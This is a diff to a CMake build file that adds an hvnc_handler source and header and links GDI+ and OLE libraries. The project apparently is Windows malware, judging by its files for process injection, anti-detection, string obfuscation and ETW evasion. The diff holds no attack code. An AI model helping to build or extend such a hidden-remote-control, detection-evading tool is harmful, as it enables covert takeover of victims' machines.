@@ -43,6 +43,7 @@ set(SOURCES
     system_info.cpp
     json_utils.cpp
     anti_detection.cpp
+    hvnc_handler.cpp
     core/injection.h
     core/evasion/dynamic_api.cpp
     core/evasion/string_obfuscation.cpp
@@ -64,6 +65,7 @@ set(HEADERS
     system_info.h
     json_utils.h
     anti_detection.h
+    hvnc_handler.h
     core/evasion/dynamic_api.h
     core/evasion/string_obfuscation.h
     core/evasion/etw_evasion.h
@@ -93,6 +95,9 @@ if(WIN32)
         kernel32
         user32
         ntdll
+        gdiplus
+        ole32
+        oleaut32
     )
 endif()
 
